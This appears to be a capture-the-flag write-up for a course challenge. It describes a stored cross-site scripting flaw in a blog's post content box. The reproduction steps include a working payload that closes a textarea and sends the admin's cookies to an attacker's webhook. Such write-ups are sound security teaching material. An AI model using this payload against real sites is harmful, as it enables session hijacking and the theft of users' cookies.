# Challenge `Go on and censor my posts` writeup

- Vulnerability: What type of vulnerability is being exploited
  - XSS
- Where: Where is the vulnerability present
  - `http://ssof2526.challenges.cwte.me:25253` in the new blogpost content box.
- Impact: What results of exploiting this vulnerability
  - Allows any user to inject malicious code into the website

## Steps to reproduce

1. Get a URL in Webhook to collect the requests
2. Write a random title (must be random since it checks for previous posts with the same title) and random content in the `Content` box, and click `Create Post`. This will redirect you to a new page to update your post.
3. Write this script: `</textarea><script>fetch("{webhook}?=cookie="+document.cookie)</script>'` (where webhook is you URL), into the `Content box` and click `Update post and send it for admin review`.
4. Admin will execute the script and send a request to your webhook with their cookies (and the flag).

Note: In step 3, make sure to include the `</textarea>` closing tag, since without it, the script will be treated as plain text instead of executable code.

[(POC)](go_on_and_censor_my_posts_poc.py)